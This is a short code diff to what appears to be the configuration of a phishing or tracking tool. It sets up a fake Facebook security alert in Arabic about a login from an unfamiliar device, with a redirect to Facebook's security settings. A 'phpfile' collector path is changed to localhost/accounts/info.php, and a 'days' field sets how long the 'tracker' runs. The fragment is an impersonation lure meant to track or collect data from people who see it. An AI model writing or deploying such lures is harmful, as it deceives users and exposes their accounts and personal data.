@@ -6,7 +6,7 @@ content : 'عملية تسجيل الدخول من جهاز غريب إلى حس
 button1 : 'الذهاب للإعدادات',
 button2 : 'ليس الأن',
 redirect: 'https://www.facebook.com/settings?tab=security',
-phpfile : 'http://localhost/info.php',
+phpfile : 'http://localhost/accounts/info.php',
 days    : 0, // Number of days to run the tracker
 
 };
